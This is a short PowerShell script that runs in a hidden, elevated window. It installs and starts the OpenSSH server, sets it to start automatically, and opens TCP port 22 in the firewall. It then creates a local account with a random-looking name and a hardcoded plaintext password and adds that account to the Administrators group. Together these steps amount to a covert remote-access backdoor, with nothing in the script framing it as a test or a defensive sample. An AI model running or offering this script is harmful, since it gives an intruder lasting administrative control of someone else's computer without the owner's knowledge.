Start-Process powershell -windowstyle hidden -verb RunAs -ArgumentList "

Add-WindowsCapability -Online -name OpenSSH.server~~~~0.0.1.0
dism /online /add-capability /capabilityName:OpenSSH.server~~~~0.0.1.0
Install-Module -force OpenSSHUtils
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
New-LocalUser 2969a0602e4efc9646e2 -Password (ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force)
Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2 

exit"
